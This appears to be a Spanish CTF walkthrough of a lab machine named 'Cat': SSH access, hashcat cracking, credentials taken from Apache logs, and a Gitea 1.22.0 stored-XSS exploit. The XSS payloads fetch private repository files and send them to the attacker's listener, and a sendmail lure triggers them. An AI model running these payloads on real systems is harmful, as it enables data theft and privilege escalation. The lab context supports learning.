Bueno con las credenciales del usuario Rosa iniciamos sesion por ssh
```bash
rosa@cat:~$ cat us
cat: us: No such file or directory
rosa@cat:~$ cat use^C
rosa@cat:~$ ls
rosa@cat:~$ ls -la
total 32
drwxr-x--- 5 rosa rosa 4096 Jan 21 12:49 .
drwxr-xr-x 6 root root 4096 Aug 30 23:19 ..
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Aug  7  2024 .bash_logout
-rw-r--r-- 1 rosa rosa 3598 Sep  1 00:43 .bashrc
drwx------ 2 rosa rosa 4096 Sep 13 00:59 .cache
drwxrwxr-x 3 rosa rosa 4096 Sep 28 05:12 .local
-rw-r--r-- 1 rosa rosa  807 Aug  7  2024 .profile
lrwxrwxrwx 1 root root    9 Aug 31 23:31 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 21 12:49 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jan 14 17:08 .ssh
rosa@cat:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
rosa@cat:~$ 
```
Vemos que el usuario no tiene el user.txt, pero hay otros usuarios con bash en el sistema como jobert o axel ; intentamos sacar sus passwords por hashacat con rockyou pero solo me saca la de Rosa y la mia 
```bash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921522
* Keyspace..: 14344386
* Runtime...: 2 secs

81dc9bdb52d04dc20036dbd8313ed055:1234                     
ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa       
Approaching final keyspace - workload adjusted.
```

Vamos a probar a hacer privesc con Rosa:

No puedo ejecutar nada con sudo y en las conexiones vemos algunos puertos interesantes pero puede que sean reverse shelss de otros usuarios
```bash
rosa@cat:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on cat.
rosa@cat:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:54383         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50391         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33189         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -    
```

Como el usuario Rosa no podemos sacar mucha mas informacion acerca de las conexiones de la maquina
```bash
Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process                             
udp         UNCONN       0            0                   127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22269 sk:90 <->        
tcp         LISTEN       0            10                      127.0.0.1:587                      0.0.0.0:*           ino:26227 sk:91 <->                
tcp         LISTEN       0            37                      127.0.0.1:54383                    0.0.0.0:*           uid:1002 ino:28805 sk:92 <->       
tcp         LISTEN       0            4096                127.0.0.53%lo:53                       0.0.0.0:*           uid:101 ino:22270 sk:93 <->        
tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*           ino:24649 sk:94 <->                
tcp         LISTEN       0            128                     127.0.0.1:50391                    0.0.0.0:*           uid:1002 ino:26155 sk:95 <->       
tcp         LISTEN       0            4096                    127.0.0.1:3000                     0.0.0.0:*           uid:114 ino:26516 sk:96 <->        
tcp         LISTEN       0            10                      127.0.0.1:25                       0.0.0.0:*           ino:26226 sk:97 <->                
tcp         LISTEN       0            1                       127.0.0.1:33189                    0.0.0.0:*           uid:1002 ino:28704 sk:98 <->       
tcp         LISTEN       0            511                             *:80                             *:*           ino:24988 sk:99 v6only:0 <->       
tcp         LISTEN       0            128                          [::]:22                          [::]:*           ino:24651 sk:9a v6only:1 <->   
```

Vamos a establecer un puente ssh con el puerto 3000 que parece interesante;
```bash
ssh rosa@cat.htb -L 3000:localhost:3000
```


# Gitea
BIngo! encontramos una web que hostea un repositorio de codigo local
![[Pasted image 20250210154828.png]]

El servicio se trata de [Gitea](https://news.ycombinator.com/item?id=31628939), un servidor de git selfhosteado; ya me he visto en algunas ocasiones con este servicio ; si alguna parte de la web o algún servicio esta vinculado con el código que se sube podemos escalar privilegios; vamos a investigar

En el source code encontramos la version de gitea
```java
Version:
			
				1.22.0
```
![[Pasted image 20250210155200.png]]

Parece que esta version es vulnerable a XSS de nuevo
[XSS-Gitea](https://www.exploit-db.com/exploits/52077)

Pero las credenciales de Rosa no funcionan para logearse y tampoco nos permiten registrarnos en el servicio:

![[Pasted image 20250210155410.png]]

Pero podemos loguearnos con OpenID ; si probamos nos promptea una direccion en local
![[Pasted image 20250210155527.png]]
Parece que el servidor busca OpenID's en la ruta /usr/login/opeid pero no la encuentro en el sistema;
Tambien intento pasarle mi servidor http pero no establece comunicacion 


# Axel (user)

Encuentro esto en `/var/log/apache.log` :
```bash
cat /var/log/apache2/access.log | grep axel
127.0.0.1 - - [11/Feb/2025:08:43:43 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

Pruebo sshing:
**![[Pasted image 20250211094521.png]]

Sudo -l :
```bash
axel@cat:~$ sudo -l
[sudo] password for axel: 
Sorry, user axel may not run sudo on cat.
```
## Mail

Hay mail para axel:
```bash
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```
Puede que el Readme.md tenga info util

Vuelvo a Gitea con las nuevas credenciales:
```python
- [ ] axel : aNdZwgC4tI9gnVXv_e3Q
```

Entramos como axel:


![[Pasted image 20250211094751.png]]
# Xss y Root
Para triggerear el XSS debemos ir a un repositorio creado previamente y darle a settings , en el campo "description " es donde podemos injectar el XSS; mas info en [exploit.db](https://www.exploit-db.com/exploits/52077)
![[Pasted image 20250211095138.png]]
![[Pasted image 20250211095254.png]]

Funciona!
![[Pasted image 20250211095608.png]]

Modificamos el XSS para robar el Readme.md y que me lo envie a mi servidor:
```java
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

Despues de mandarle un mail a jobert tenemos un callback
mail:
```bash
axel@cat:~$ echo -e "Subject: Test \n\n check this mdfck http://localhost:3000/axel/XSS" | sendmail jobert@cat.htb
```

```java
10.10.11.53 - - [11/Feb/2025 10:35:36] "GET /?d=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 -

```



![[Pasted image 20250211103602.png]]

Esta en base64 lo descifro pero nada interesante

![[Pasted image 20250211103836.png]]

Probamos con otro payload ; ahora vamos a leer el index.php
```java
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.232:2323/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```
Le volvemos a mandar el mismo mail a jobert para triggerear el xss de nuevo;
![[Pasted image 20250211105340.png]]
## Index.php :
```bash
➜  Cat echo "PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK" | base64 -d
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
base64: invalid input
➜  Cat 
```
Bueno pues resulta que las creds de admin es la password de root:
![[Pasted image 20250211105458.png]]